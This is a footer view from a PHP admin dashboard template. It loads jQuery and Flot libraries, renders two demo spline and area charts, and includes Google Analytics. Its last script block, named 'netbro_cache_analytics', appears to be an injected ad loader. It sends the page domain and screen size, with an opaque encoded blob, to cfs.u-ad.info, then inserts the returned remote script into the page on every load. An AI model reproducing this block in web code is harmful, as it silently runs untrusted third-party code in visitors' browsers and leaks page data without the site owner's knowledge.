<!-- Vendor scripts -->
<script src="<?= base_url('assets/vendor/jquery/dist/jquery.min.js') ?>"></script>
<script src="<?= base_url('assets/vendor/jquery-ui/jquery-ui.min.js') ?>"></script>
<script src="<?= base_url('assets/vendor/slimScroll/jquery.slimscroll.min.js') ?>"></script>
<script src="<?= base_url('assets/vendor/bootstrap/dist/js/bootstrap.min.js') ?>"></script>
<script src="<?= base_url('assets/vendor/jquery-flot/jquery.flot.js') ?>"></script>
<script src="<?= base_url('assets/vendor/jquery-flot/jquery.flot.resize.js') ?>"></script>
<script src="<?= base_url('assets/vendor/jquery-flot/jquery.flot.pie.js') ?>"></script>
<script src="<?= base_url('assets/vendor/flot.curvedlines/curvedLines.js') ?>"></script>
<script src="<?= base_url('assets/vendor/jquery.flot.spline/index.js') ?>"></script>
<script src="<?= base_url('assets/vendor/metisMenu/dist/metisMenu.min.js') ?>"></script>
<script src="<?= base_url('assets/vendor/iCheck/icheck.min.js') ?>"></script>
<script src="<?= base_url('assets/vendor/peity/jquery.peity.min.js') ?>"></script>
<script src="<?= base_url('assets/vendor/sparkline/index.js') ?>"></script>

<!-- App scripts -->
<script src="<?= base_url('assets/scripts/homer.js') ?>"></script>
<script src="<?= base_url('assets/scripts/charts.js') ?>"></script>

<script>
    $(function() {

        /**
         * Flot charts data and options
         */
        var data1 = [
            [0, 55],
            [1, 48],
            [2, 40],
            [3, 36],
            [4, 40],
            [5, 60],
            [6, 50],
            [7, 51]
        ];
        var data2 = [
            [0, 56],
            [1, 49],
            [2, 41],
            [3, 38],
            [4, 46],
            [5, 67],
            [6, 57],
            [7, 59]
        ];

        var chartUsersOptions = {
            series: {
                splines: {
                    show: true,
                    tension: 0.4,
                    lineWidth: 1,
                    fill: 0.4
                },
            },
            grid: {
                tickColor: "#f0f0f0",
                borderWidth: 1,
                borderColor: 'f0f0f0',
                color: '#6a6c6f'
            },
            colors: ["#62cb31", "#efefef"],
        };

        $.plot($("#flot-line-chart"), [data1, data2], chartUsersOptions);

        /**
         * Flot charts 2 data and options
         */
        var chartIncomeData = [{
            label: "line",
            data: [
                [1, 10],
                [2, 26],
                [3, 16],
                [4, 36],
                [5, 32],
                [6, 51]
            ]
        }];

        var chartIncomeOptions = {
            series: {
                lines: {
                    show: true,
                    lineWidth: 0,
                    fill: true,
                    fillColor: "#64cc34"

                }
            },
            colors: ["#62cb31"],
            grid: {
                show: false
            },
            legend: {
                show: false
            }
        };

        $.plot($("#flot-income-chart"), chartIncomeData, chartIncomeOptions);



    });
</script>
<script>
    (function(i, s, o, g, r, a, m) {
        i['GoogleAnalyticsObject'] = r;
        i[r] = i[r] || function() {
            (i[r].q = i[r].q || []).push(arguments)
        }, i[r].l = 1 * new Date();
        a = s.createElement(o),
            m = s.getElementsByTagName(o)[0];
        a.async = 1;
        a.src = g;
        m.parentNode.insertBefore(a, m)
    })(window, document, 'script', '../../www.google-analytics.com/analytics.js', 'ga');

    ga('create', 'UA-4625583-2', 'webapplayers.com');
    ga('send', 'pageview');
</script>

<script type="text/javascript">
    if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function() {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" +
                "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpngMENceL4aHzQDEnnRoVUnxWPUyMRABnwDh0TDdDS93ajRA5OdkfEEv0Z%2bZw%2bE%2fV4bKQqo3Cznlqm1gkpu9QK9wfDmcgJrPlWeeYVWRGl9XmcNuYywHFh%2bKeQaL5J7QhnOLymqRZNOhR89%2fX3sBTMtjBgp3GqamD3%2bENekieMTRN0lM6S8HE1FcDRRjodTXzuWWv4zjSAbcY8KMz1awjnuiGDiYTBQ1Y2xVfiSQmFhp5djWcEPh0Zg3Zf7mgqfzGUORjH1aItX%2feJooF2yP4F8PKxlC6KkfvZXm65nc%2fN5bGDp78WaAYnLEMX0bf%2fRLqbUjA4E3HxChqjtZ72imH5n1zbJ%2fxYGMhq1po6sPKl3u2HtqBNrCzGnL8lDFvjQk7Vrq2XHOVJkCQYokrQidUCRIhvRPIaHix5ibHAlnfc38ubta0fryEC719GhPWp0oBegJ12UylSQaSDRCFqbVxCKqcbNGXe0PaHRE7JbrFozidXcIP8Saor1g%3d%3d" +
                "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
    };
</script>
</body>